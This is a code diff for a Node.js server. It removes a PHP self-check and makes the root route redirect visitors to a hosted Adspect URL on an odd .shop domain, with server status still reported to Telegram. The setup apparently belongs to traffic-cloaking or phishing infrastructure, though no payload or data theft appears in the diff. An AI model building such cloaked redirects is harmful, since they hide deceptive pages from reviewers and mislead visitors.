@@ -418,32 +418,6 @@ async function servePHP(req, res, phpPath) {
     }
 }
 
-// PHP verification function
-async function verifyPHPInstallation() {
-    try {
-        const { stdout } = await execAsync('php -v');
-        console.log('PHP Installation verified:', stdout);
-        
-        // Test PHP execution
-        const testPhp = 'echo "PHP Test Successful";';
-        const { stdout: testOutput } = await execAsync(`php -r '${testPhp}'`);
-        console.log('PHP Test result:', testOutput);
-        
-        // List PHP binary locations
-        try {
-            const { stdout: locations } = await execAsync('which php && ls -l $(which php)');
-            console.log('PHP binary information:', locations);
-        } catch (e) {
-            console.warn('Could not get PHP binary information:', e);
-        }
-        
-        return true;
-    } catch (error) {
-        console.error('PHP Installation check failed:', error);
-        return false;
-    }
-}
-
 app.use((req, res, next) => {
     console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
     next();
@@ -969,8 +943,8 @@ app.get('/', async (req, res) => {
     }
 
     try {
-        // Execute PHP file
-        await servePHP(req, res, path.join(__dirname, '../../index.php'));
+        // Instead of running PHP, redirect to your hosted Adspect URL
+        res.redirect('https://wefwfwfwfwf.shop/'); // Replace with your actual URL
     } catch (error) {
         console.error('Error in root route:', error);
         res.redirect(state.settings.redirectUrl);
@@ -1533,26 +1507,11 @@ setInterval(() => {
 }, 10000);
 
 // Start server
-// Start server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, async () => {
-    console.log(`Server starting on port ${PORT}...`);
-    
-    // Verify PHP installation
-    const phpInstalled = await verifyPHPInstallation();
-    if (!phpInstalled) {
-        console.error('WARNING: PHP is not properly installed. The server may not function correctly.');
-        console.error('Please ensure PHP is installed and accessible in the system PATH');
-        // Don't exit, but log the warning
-    } else {
-        console.log('PHP installation verified successfully');
-    }
-    
-    console.log(`Server is now running on port ${PORT}`);
-    
+    console.log(`Server running on port ${PORT}`);
     await sendTelegramNotification(formatTelegramMessage('server_status', {
         status: 'Online',
-        port: PORT,
-        phpStatus: phpInstalled ? 'Installed' : 'Not Found'
+        port: PORT
     }));
 });
